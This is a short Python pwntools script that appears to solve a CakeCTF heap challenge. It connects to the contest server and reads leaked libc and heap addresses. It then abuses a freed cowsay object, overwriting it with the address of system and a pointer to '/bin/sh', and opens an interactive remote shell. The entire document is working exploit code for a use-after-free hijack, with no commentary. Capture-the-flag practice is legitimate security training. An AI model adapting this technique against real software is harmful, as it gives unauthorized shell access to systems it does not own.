from pwn import *
s = remote('pwn.cakectf.com', 9001)

def use_cowsay():
    s.sendlineafter(b'> ', b'1')
    return (s.recvuntil(b'1')[:-1]).decode()

def change_message(data):
    s.sendlineafter(b'> ', b'2')
    s.sendlineafter(b'Message: ', data)

def delete_cowsay():
    s.sendlineafter(b'> ', b'3')

def describe_heap():
    s.sendlineafter(b'> ', b'4')
    return (s.recvuntil(b'1. Use cowsay')[:-13]).decode()

s.recvuntil(b'<system> = ')
system = int(s.recvline()[:-1], 16)
print(hex(system))

s.sendlineafter(b'> ', b'4')
s.recvuntil(b'0x')
addr = int(s.recv(10).decode() + 'c0', 16)
print('addr:', hex(addr))

change_message(b'/bin/sh\0')
delete_cowsay()
change_message(p64(system)+p64(addr))
use_cowsay()
s.interactive()
